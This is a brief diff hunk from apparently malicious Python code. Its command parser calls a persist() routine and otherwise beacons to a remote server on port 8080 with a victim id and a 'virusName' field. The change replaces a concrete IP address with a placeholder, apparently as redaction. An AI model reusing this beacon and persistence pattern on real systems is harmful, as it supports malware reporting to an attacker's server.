@@ -59,7 +59,7 @@ def parse_command(message):
     elif "persist" in message:
         persist()
     else:
-        req.get('http://134.209.172.95:8080/api/submit?id=%s&virusName=2' % argv[1])
+        req.get('http://x.x.x.x:8080/api/submit?id=%s&virusName=2' % argv[1])
         return
 
 
